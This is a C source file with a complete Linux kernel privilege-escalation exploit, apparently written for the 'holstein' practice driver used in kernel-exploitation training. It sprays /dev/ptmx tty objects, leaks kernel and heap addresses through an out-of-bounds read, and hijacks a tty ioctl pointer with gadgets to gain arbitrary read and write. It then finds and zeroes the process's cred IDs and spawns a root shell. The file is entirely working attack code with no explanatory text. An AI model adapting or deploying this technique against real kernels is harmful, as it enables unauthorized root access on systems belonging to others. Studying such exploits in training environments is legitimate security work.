#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <unistd.h>

int fd;
int tty[100];
int target = 0;

uintptr_t offset;
#define OFFSET(addr) (addr + offset)

uintptr_t g_buf;

uintptr_t mov_prdx_ecx	= 0xffffffff814b27c2;
uintptr_t mov_eax_prdx	= 0xffffffff81440428;

static void leak_offset_and_g_buf(void)
{
	uint8_t data[0x440];

	read(fd, data, 0x440);
	offset = *(uintptr_t *)&data[0x418] - 0xffffffff81c38880;
	printf("[+] offset %p\n", offset);

	g_buf = *(uintptr_t *)&data[0x438] - 0x438;
	printf("[+] g_buf %p\n", g_buf);
}

static void set_ioctl(uintptr_t ptr)
{
	uint8_t data[0x420];

	read(fd, data, 0x420);
	*(uintptr_t *)&data[0x0c * 8] = ptr;
	*(uintptr_t *)&data[0x418] = g_buf;

	write(fd, data, 0x420);
}

static uint32_t fast_ioctl(int op, uintptr_t argp)
{
	uint32_t ret;

	if (target) {
		ret = ioctl(target, op, argp);
	} else {
		for (int i = 0; i < 100; ++i) {
			ret = ioctl(tty[i], op, argp);
			if (ret != -1) {
				target = tty[i];
				break;
			}
		}
	}

	return ret;
}

static uintptr_t search_cred(void)
{
	uint8_t name[16] = "$this_is_evil_$";
	uintptr_t ptr = g_buf - 0x500000;
	uintptr_t cred;
	uint32_t tmp;

	if (prctl(PR_SET_NAME, name) == -1) {
		perror("[-] prctl");
		return -1;
	}

	set_ioctl(OFFSET(mov_eax_prdx));

	while (true) {
		if (ptr >= g_buf)
			return -1;

		tmp = fast_ioctl(0, ptr);
		if (tmp != *(uint32_t *)name) {
			ptr += 8;
			continue;
		}

		tmp = fast_ioctl(0, ptr + 4);
		if (tmp != *(uint32_t *)&name[4]) {
			ptr += 8;
			continue;
		}

		tmp = fast_ioctl(0, ptr + 8);
		if (tmp != *(uint32_t *)&name[8]) {
			ptr += 8;
			continue;
		}

		tmp = fast_ioctl(0, ptr + 12);
		if (tmp != *(uint32_t *)&name[12]) {
			ptr += 8;
			continue;
		}

		break;
	}

	cred = (uintptr_t)fast_ioctl(0, ptr - 4) << 32;
	cred |= fast_ioctl(0, ptr - 8);

	return cred;
}

static void aaw(uintptr_t ptr, uint8_t *buf, size_t len)
{
	size_t left = len;
	uint32_t tmp;

	set_ioctl(OFFSET(mov_prdx_ecx));

	for (int i = 0; i < len; i += 4, left -= 4) {
		if (left >= 4) {
			tmp = *(uint32_t *)(buf + i);
		} else {
			tmp = 0;
			for (int i = 0; i < left; ++i)
				tmp |= (uint32_t)(*(uint8_t *)(buf + i))
				       << (3 - i) * 8;
		}

		fast_ioctl(tmp, ptr + i);
	}
}

int main(void)
{
	uintptr_t cred;

	for (int i = 0; i < 50; ++i) {
		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (tty[i] == -1) {
			perror("[-] open");
			return EXIT_FAILURE;
		}
	}

	fd = open("/dev/holstein", O_RDWR);
	if (fd == -1) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	for (int i = 50; i < 100; ++i) {
		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (tty[i] == -1) {
			perror("[-] open");
			return EXIT_FAILURE;
		}
	}

	leak_offset_and_g_buf();

	printf("[+] searching cred ...\n");
	cred = search_cred();
	if (cred == -1) {
		printf("[-] cred not found\n");
		return EXIT_FAILURE;
	} else {
		printf("[+] cred %p\n", cred);
	}

	aaw(cred + 4,
	    "\x00\x00\x00\x00"
	    "\x00\x00\x00\x00"
	    "\x00\x00\x00\x00"
	    "\x00\x00\x00\x00"
	    "\x00\x00\x00\x00"
	    "\x00\x00\x00\x00"
	    "\x00\x00\x00\x00"
	    "\x00\x00\x00\x00",
	    32);

	printf("[+] get r00t!\n");
	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);

	close(fd);
	return EXIT_SUCCESS;
}
